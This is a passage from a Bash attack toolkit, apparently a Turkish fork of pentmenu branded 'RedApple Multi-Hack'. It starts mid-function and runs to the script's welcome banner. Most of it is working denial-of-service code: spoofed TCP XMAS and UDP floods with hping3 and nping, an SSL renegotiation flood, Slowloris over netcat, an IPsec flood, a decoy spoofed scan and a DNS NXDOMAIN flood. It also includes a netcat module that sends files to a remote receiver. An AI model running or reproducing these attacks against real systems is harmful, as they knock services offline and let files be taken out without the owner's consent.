		echo "Gönderilecek Toplam Veri Sayısını Seçin(Varsayılan=100000):"
	read TOTAL
		: ${TOTAL:=100000}
		echo "TCP XMAS Flood Saldırısı Aktif..."
#begin TCP RST flood using values defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags cwr,ecn,urg,ack,psh,rst,syn,fin --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags cwr,ecn,urg,ack,psh,rst,syn,fin --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}
##END TCPXMASFLOOD##
###################

##################
##START UDPFLOOD##
udpflood()
{ echo "hping3 ile UDP Flood Saldırısı Hazırlanıyor..."
#check for hping on the local system
if test -f "/usr/sbin/hping3"; then echo "hping3 Bulundu ! Yükleniyor...";
#hping3 is found, so use that for UDP Flood
#need a valid target IP/hostname
	echo "Hedef IP veya Host Adı Giriniz:"
		read -i $TARGET -e TARGET
#need a valid target UDP port
	echo "Hedef Portu Giriniz(Varsayılan:80):"
		read -i $PORT -e PORT
		: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Geçerli Bir Port Değeri Girilmedi,Port 80 Olarak Ayarlanıyor.."
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Yanlış Bir Port Seçildi,Port 80 Olarak Ayarlanıyor.."
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Port Geçersiz ! 80 Olarak Ayarlanıyor.."
	else echo "Port Kullanılıyor:$PORT"
	fi
#what data should we send with each packet?
#curently only accepts stdin.  Can't define a file to read from
	echo "Veri Değeri veya Dosya Konumu Belirtiniz:"
		read DATA
#what source IP should we write to sent packets?
	echo "IP Tipini Seçiniz(Rastgele için r Arayüz için ise i yi tuşlayın)/Ya da IP Giriniz:"
		read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#start the attack using values defined earlier
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "UDP Flood Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 --flood --spoof $SOURCE --udp --sign $DATA -p $PORT $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "UDP Flood Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 --flood --rand-source --udp --sign $DATA -p $PORT $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "UDP Flood Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 --flood --udp --sign $DATA -p $PORT $TARGET
#if no valid source option is selected, use outgoing interface IP
	else echo "Geçerli Bir Opsiyon Değil ! Arayüz IP Kullanılıyor.."
		echo "UDP Flood Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 --flood --udp --sign $DATA -p $PORT $TARGET
	fi
#If no hping3, use nping for UDP Flood instead.  Not ideal but it will work.
	else echo "hping3 Bulunamadı ! Alternatif Olarak nping Kullanılacak..."
		echo ""
		echo "nping ile UDP Flood Saldırısı Hazırlanıyor..(UYARI:Çalışma İhtimali hping3 e Göre Daha Zayıftır)"
		echo "Hedef IP veya Host Adı Giriniz:"
#need a valid target IP/hostname
	read -i $TARGET -e TARGET
		echo "Hedef Portu Giriniz(Varsayılan:80):"
#need a port to send UDP packets to
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Geçerli Bir Port Değeri Girilmedi,Port 80 Olarak Ayarlanıyor.."
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Yanlış Bir Port Seçildi,Port 80 Olarak Ayarlanıyor.."
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Port Geçersiz ! 80 Olarak Ayarlanıyor.."
	else echo "Port Kullanılıyor:$PORT"
	fi
#what source address should we use in sent packets?
		echo "IP Tipini Seçiniz(Arayüz için ise i yi tuşlayın) veya IP Giriniz::"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#how many packets should we try to send each second?
		echo "Saniyede Gönderilecek Veri Sayısını Seçin(Varsayılan=10000):"
	read RATE
		: ${RATE:=10000}
#how many packets should we send in total?
		echo "Gönderilecek Toplam Veri Sayısını Seçin(Varsayılan=100000):"
	read TOTAL
		: ${TOTAL:=100000}
#default values will send 10k packets each second, for 10 seconds
#what data should we send with each packet?
#curently only accepts stdin.  Can't define a file to read from
		echo "Veri Değeri veya Dosya Konumu Belirtiniz:"
	read DATA
		echo "UDP Flood Saldırısı Aktif..."
#start the UDP flood using values we defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --udp --dest-port $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --udp --dest-port $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
fi
}
##END UDPFLOOD##
################

################
##START SSLDOS##
ssldos()
{ echo "openssl Kullanılarak SSL/DOS Saldırısı Hazırlanıyor.."
		echo "Hedef IP veya Host Adı Giriniz:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a target port
		echo "Hedef Portu Giriniz(Varsayılan:443):"
read -i $PORT -e PORT
: ${PORT:=443}
#check a valid target port is entered otherwise assume port 443
if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
	PORT=443 && echo "Lütfen Port Değeri İçin Bir Yazı Değil,Numara Giriniz ! Port 443 Olarak Ayarlanıyor..."
fi
if [ "$PORT" -lt "1" ]; then
	PORT=443 && echo "Yanlış Bir Port Numarası Seçildi ! Port 443 Olarak Ayarlanıyor... "
elif [ "$PORT" -gt "65535" ]; then
	PORT=443 && echo "Port Geçersiz ! Port 443 Olarak Ayarlanıyor..."
else echo "Using port $PORT"
fi
#do we want to use client renegotiation?
	echo "Veri Alıcıya Yinelenerek Gönderilsin Mi? (e)vet (h)ayır:"
read NEGOTIATE
: ${NEGOTIATE:=h}
if [[ $NEGOTIATE = e ]]; then
#if client renegotiation is selected for use, launch the attack supporting it
	echo "SSL DOS Saldırısı Başlatılıyor..Çıkmak İçin Ctrl+C Yapınız" && sleep 1
while : for i in {1..10}
	do echo "Örnek Başlatılıyor...Veri Tekrarlaması Hazırlanıyor...Saldırı Aktif !"; echo "R" | openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
done
elif [[ $NEGOTIATE = n ]]; then
#if client renegotiation is not requested, lauch the attack without support for it
	echo "SSL DOS Saldırısı Başlatılıyor..Çıkmak İçin Ctrl+C Yapınız" && sleep 1
while : for i in {1..10}
	do echo "Saldırı Aktif !"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
done
#if an invalid option is chosen for client renegotiation, launch the attack without it
else
	echo "Geçersiz Opsiyon..Yineleme Faktörü Devre Dışı"
	echo "SSL DOS Saldırısı Başlatılıyor..Çıkmak İçin Ctrl+C Yapınız" && sleep 1
while : for i in {1..10}
	do echo "Saldırı Aktif !"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
done
fi
#The SSL/TLS DOS code is crude but it can be brutally effective
}
##END SSLDOS##
##############

##################
##START SLOWLORIS##
slowloris()
{ echo "netcat ile Slowloris Saldırısı Hazırlanıyor..." && sleep 1
echo "Hedef IP veya Host Adı Giriniz:"
#need a target IP or hostname
	read -i $TARGET -e TARGET
echo "Target is set to $TARGET"
#need a target port
echo "Hedef Portu Giriniz(Varsayılan:80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Geçerli Bir Port Değeri Girilmedi,Port 80 Olarak Ayarlanıyor.."
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Yanlış Bir Port Seçildi,Port 80 Olarak Ayarlanıyor.."
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Port Geçersiz ! 80 Olarak Ayarlanıyor.."
	else echo "Port Kullanılıyor:$PORT"
	fi
#how many connections should we attempt to open with the target?
#there is no hard limit, it depends on available resources.  Default is 2000 simultaneous connections
echo "Lütfen Saldırı İçin Açılacak Bağlantı Sayısını Seçin"
		read CONNS
	: ${CONNS:=2000}
#ensure a valid integer is entered
	if ! [[ "$CONNS" =~ ^[0-9]+$ ]]; then
CONNS=2000 && echo "Yanlış Değer Girildi! Açılan Bağlantı Sayısı=2000"
	fi
#how long do we wait between sending header lines?
#too long and the connection will likely be closed
#too short and our connections have little/no effect on server
#either too long or too short is bad.  Default random interval is a sane choice
echo "Lütfen Girdiğiniz Bağlantıların Kaç Saniyede Açılacağını Ayarlayın"
echo "Saldırı Süresi:(Varsayılan Değer Rastgele 5 ila 15 Saniye Arasındadır)"
	read INTERVAL
	: ${INTERVAL:=r}
	if [[ "$INTERVAL" = "r" ]]
then
#if default (random) interval is chosen, generate a random value between 5 and 15
#note that this module uses $RANDOM to generate random numbers, it is sufficient for our needs
INTERVAL=$((RANDOM % 11 + 5))
#check that r (random) or a valid number is entered
	elif ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] && ! [[ "$INTERVAL" = "r" ]]
then
#if not r (random) or valid number is chosen for interval, assume r (random)
INTERVAL=$((RANDOM % 11 + 5)) && echo "Invalid integer!  Using random value between 5 and 15 seconds"
	fi
#run stunnel_client function
stunnel_client
if [[ "$SSL" = "y" ]]
then
#if SSL is chosen, set the attack to go through local stunnel listener
echo "Slowloris Saldırısı Başlatılıyor..İşlemin Başlamasını İptal Etmek İçin Ctrl+C Yapınız" && sleep 1
	i=1
	while [ "$i" -le "$CONNS" ]; do
echo "Slowloris Saldırısı Aktif...this is connection $i, interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $LHOST $LPORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
echo "$CONNS Bağlantıları Çalışıyor...Menüye Yönlendiriliyor"
else
#if SSL is not chosen, launch the attack on the server without using a local listener
echo "Slowloris Saldırısı Başlatılıyor..İşlemin Başlamasını İptal Etmek İçin Ctrl+C Yapınız" && sleep 1
	i=1
	while [ "$i" -le "$CONNS" ]; do
echo "Slowloris Saldırısı Aktif...this is connection $i, interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
#return to menu once requested number of connections has been opened or resources are exhausted
echo "$CONNS Bağlantıları Çalışıyor...Menüye Yönlendiriliyor"
fi
}
##END SLOWLORIS##
#################

###################
##START IPSEC DOS##
ipsecdos()
{ echo "BİLGİ:Bu Modül Sahte IPSec Sunucusu Kullanarak Sahte Kaynak Adresleri Üretir"
echo "Hedef IP veya Host Adı Giriniz:"
read -i $TARGET -e TARGET
#launch DOS with a random source address by default
echo "IPsec DOS Saldırısı Çalışıyor...İşlemi Durdurmak İçin Ctrl+C Yapınız" &&
while :
do sudo ike-scan -A -B 100M -t 1 --sourceip=random $TARGET 1>/dev/null; sudo ike-scan -B 100M -t 1 -q --sourceip=random $TARGET 1>/dev/null
done
}
##END IPSEC DOS##
#################

#####################
##START DISTRACTION##
distractionscan()
{ echo "Bu Modül Sahte Kaynak Adresleriyle Beraber Geciktirme Etkisi Olan Bir TCP SYN Taraması Yapar"
echo "UYARI:Bu Modül Hedefin Dikkatini Dağıtabilmek Amacıyla Açık Şekilde Tasarlandı,Gerçek Bir Tarama Yaparak da Harekete Geçirilebilir"
echo "Hedef IP veya Host Adı Giriniz:"
#need target IP/hostname
read -i $TARGET -e TARGET
echo "Hedef Kaynak Adresi Giriniz:"
#need a spoofed source address
read -i $SOURCE -e SOURCE
#use hping to perform multiple obvious TCP SYN scans
for i in {1..5}; do echo "sending scan $i" && sudo hping3 --scan all --spoof $SOURCE -S $TARGET 2>/dev/null 1>/dev/null; done
exit 0
}
##END DISTRACTION##
###################

#######################
##START NXDOMAINFLOOD##
nxdomainflood()
{ echo "Bu Modül Sorgu Sayısı Ve Geçersiz Domainler Yardımıyla DNS Sunucusuna Aşırı Yükleme İşlemi Gerçekleştirir"
echo "Hedef DNS Sunucusunun IP Adresini Giriniz:"
read -i $DNSTARGET -e DNSTARGET
echo "$DNSTARGET Hedefine DNS NXDOMAIN Flood Saldırısı Aktif...İşlemi Durdurmak İçin Ctrl+C Yapınız" && sleep 1
while :
do dig $RANDOM.$RANDOM$RANDOM @$DNSTARGET
done
exit 0
}
##END NXDOMAINFLOOD##
#####################

##/DOS##


##EXTRACTION##
########################
##START EXTRACTIONMENU##
extractionmenu()
{
#display a menu for the extraction module using bash select
        extractionmenu=("Dosya Gönder" "Dinleyici Oluştur" "Geri")
    select extractopt in "${extractionmenu[@]}"; do
#Extract file with TCP or UDP
    if [ "$extractopt" = "Dosya Gönder" ]; then
        sendfile
#Create an arbitrary listener to receive files
    elif [ "$extractopt" = "Dinleyici Oluştur" ]; then
		listener
#Go back
    elif [ "$extractopt" = "Geri" ]; then
        mainmenu
#Default error if no valid option is chosen
    else
        echo "Lütfen Geçerli Bir Mod Seçiniz..Geri Gitmek İçin Enter a Basın"
    fi
    done
}
##END EXTRACTIONMENU##
######################

##################
##START SENDFILE##
sendfile()
	{ echo "Bu Modül TCP veya UDP Protokolü İle Dosya Aktarımını Sağlar"
	echo "Dosyayı Aktarmak İçin Dinleyici Kullanabilirsiniz"
echo "Lütfen Protokol Tipi Giriniz (t)cp(Varsayılan) (u)dp:"
	read -i $PROTO -e PROTO
	: ${PROTO:=t}
#if not t (tcp) or u (udp) is chosen, assume tcp required
if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
	echo "Yanlış Protokolde Bir Opsiyon Seçildi! TCP Varsayılıyor.." && PROTO=t && echo ""
fi
echo "Alıcı Sunucunun IP Adresini Giriniz:"
#need to know the IP of the receiving end
  read -i $RECEIVER -e RECEIVER
#need to know a destination port on the server
  echo "Port Girin"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Geçerli Bir Port Değeri Girilmedi,Port 80 Olarak Ayarlanıyor.."
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Yanlış Bir Port Seçildi,Port 80 Olarak Ayarlanıyor.."
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Port Geçersiz ! 80 Olarak Ayarlanıyor.."
	else echo "Port Kullanılıyor:$PORT"
	fi
#what file are we sending?
  echo "Lütfen Göndermek İstediğiniz Dosyanın Yolunu Belirtiniz:"
  read -i $EXTRACT -e EXTRACT
#send the file
echo "Dosya Alıcıya Gönderiliyor...,$RECEIVER:$PORT"
if [ "$PROTO" = "t" ]; then
nc -w 3 -n -N $RECEIVER $PORT < $EXTRACT
else
nc -n -N -u $RECEIVER $PORT < $EXTRACT
fi
echo "Dosya Gönderme İşlemi Tamamlandı"
#generate hashes of file we are sending
echo "Generating hash checksums"
md5sum $EXTRACT
echo ""
sha512sum $EXTRACT
sleep 1
}
##END SENDFILE##
################

##################
##START LISTENER##
listener()
	{ echo "This module will create a TCP or UDP listener using netcat"
	echo "Any data (string or file) received will be written out to ./pentmenu.listener.out"
echo "Enter protocol, [t]cp (default) or [u]dp:"
	read -i $PROTO -e PROTO
	: ${PROTO:=t}
#if not t (tcp) or u (udp) is chosen, assume tcp listener required
if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
	echo "Invalid protocol option selected, assuming tcp!" && PROTO=t && echo ""
fi
#show listening ports on system using ss (if available) otherwise use netstat
	echo "Listing current listening ports on this system.  Do not attempt to create a listener on one of these ports, it will not work." && echo ""
if test -f "/bin/ss"; then
	LISTPORT=ss;
	else LISTPORT=netstat

fi
#now we can ask what port to create listener on
#it cannot of course listen on a port already in use
	$LISTPORT -$PROTO -n -l
echo "Enter port number to listen on (defaults to 8000):"
	read -i $PORT -e PORT
	: ${PORT:=8000}
#if not an integer is entered, assume default port 8000
if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
		PORT=8000 && echo "You provided a string, not a port number!  Reverting to port 8000"
fi
#ensure a valid port number, between 1 and 65,535 (inclusive) is entered
if [ "$PORT" -lt "1" ]; then
		PORT=8000 && echo "Invalid port number chosen!  Reverting to port 8000"
	elif [ "$PORT" -gt "65535" ]; then
		PORT=8000 && echo "Invalid port number chosen!  Reverting to port 8000"
fi
#define where to save everything received to the listener
echo "Dışa Aktarılacak Dosyayı Giriniz(defaults to pentmenu.listener.out):"
	read -i $OUTFILE -e OUTFILE
	: ${OUTFILE:=pentmenu.listener.out}
echo "İşlemi İptal Etmek İçin Ctrl+C Yapınız"
#create the listener
if [ "$PROTO" = "t" ] && [ "$PORT" -lt "1025" ]; then
	sudo nc -n -l -v -p $PORT > $OUTFILE
elif  [ "$PROTO" = "t" ] && [ "$PORT" -gt "1024" ]; then
	nc -n -l -v -p $PORT > $OUTFILE
elif  [ "$PROTO" = "u" ] && [ "$PORT" -lt "1025" ]; then
	sudo nc -n -u -k -l -v -p $PORT > $OUTFILE
elif  [ "$PROTO" = "u" ] && [ "$PORT" -gt "1024" ]; then
	nc -n -u -k -l -v -p $PORT > $OUTFILE
fi
#done message and checksums will only work for tcp file transfer
#with udp, the connection has to be manually closed with 'ctrl C'
sync && echo "İşlem Tamamlandı"
#generate hashes of file received
echo "Hash Fonksiyonları Çalıştırılıyor..."
md5sum $OUTFILE
echo ""
sha512sum $OUTFILE
sleep 1
}
##END LISTENER##
################

################
##/EXTRACTION##


##README##
####################
##START SHOWREADME##
showreadme()
#use curl to show the readme file
#i should probably add a check for a local copy
{
curl -s https://raw.githubusercontent.com/GinjaChris/pentmenu/master/README.md | more
}
##END SHOWREADME##
##################
##/README##


##GENERIC##
#################
##START STUNNEL##
stunnel_client()
{ echo "SSL/TLS Kullanılsın Mı? evet hayır"
	read SSL
	: ${SSL:=n}
#if not using SSL/TLS, carry on what we were doing
#otherwise create an SSL/TLS tunnel using a local listener on TCP port 9991
if [[ "$SSL" = "y" ]]
	then echo "Using SSL/TLS"
LHOST=127.0.0.1
LPORT=9991
#ascertain if stunnel is defined in /etc/services and if not, add it & set permissions correctly
grep -q $LPORT /etc/services
if [[ $? = 1 ]]
then
echo "Redapple Servis Hizmetleri Gerekli İstemlere Yükleniyor... /etc/services" && sudo chmod 777 /etc/services && sudo echo "redapple-stunnel-client 9991/tcp #redapple stunnel client listener" >> /etc/services &&  sudo chmod 644 /etc/services
fi
#is ss is available, use that to shoew listening ports
if test -f "/bin/ss"; then
	LISTPORT=ss;
#otherwise use netstat
	else LISTPORT=netstat
fi
#show listening ports and check for port 9991
$LISTPORT -tln |grep -q $LPORT
if [[ "$?" = "1" ]]
#if nothing is running on port 9991, create stunnel configuration
then
	echo "Arabirim Oluşturuluyor on $LHOST:$LPORT"
		sudo rm -f /etc/stunnel/pentmenu.conf;
		sudo touch /etc/stunnel/pentmenu.conf && sudo chmod 777 /etc/stunnel/pentmenu.conf
		sudo echo "[PENTMENU-CLIENT]" >> /etc/stunnel/pentmenu.conf
		sudo echo "client=yes" >> /etc/stunnel/pentmenu.conf
		sudo echo "accept=$LHOST:$LPORT" >> /etc/stunnel/pentmenu.conf
		sudo echo "connect=$TARGET:$PORT" >> /etc/stunnel/pentmenu.conf
		sudo echo "verify=0" >> /etc/stunnel/pentmenu.conf
		sudo chmod 644 /etc/stunnel/pentmenu.conf
		sudo stunnel /etc/stunnel/pentmenu.conf && sleep 1
#if stunnel listener is already active we don't bother recreating it
else echo "Gerekli Protokoller 9991 Portunda İzleniyor Gibi Gözüküyor...Herhangi Bir İşleme Gerek Yok"
fi
fi }
##END STUNNEL##
###############
##/GENERIC##


##WELCOME##
#########################
##START WELCOME MESSAGE##
#everything before this is a function and functions have to be defined before they can be used
#so the welcome message MUST be placed at the end of the script
	clear && echo ""
echo " ________  ______   _______    _____    _________   _________  _         _______ "
echo "|  ____  ||  ____ \|  ____ \  / ___ \  |  _____  | |  _____  || |       |  ____/ "
echo "| |    | || |    \/| |    \ || /   \ | | |     | | | |     | || |       | |      "  
echo "| |____| || |__    | |    | || |   | | | |_____| | | |_____| || |       | |__    " 
echo "|  _____ ||  __)   | |    | || |___| | |  _______| |  _______|| |       |  __)   "   
echo "| |\  \   | |      | |    | || |   | | | |         | |        | |       | |      "
echo "| | \  \  | |____/\| |___/  || |   | | | |         | |        | |______ | |____  "
echo "|_|  \__\ (_______/|_______/ |_|   |_| |_|         |_|        \________\(______\ "
echo "                                                                                 "
echo "RedApple Multi-Hack Scriptine Hoş Geldiniz (Made bytarikesen)"
echo ""
echo "Programın Sürümü:1.1"
echo "Bu Programda Yapılan İşlemlerin Tamamından Kullanıcı Sorumludur."
echo ""
echo ""
mainmenu
##END WELCOME MESSAGE##
#######################
##/WELCOME##
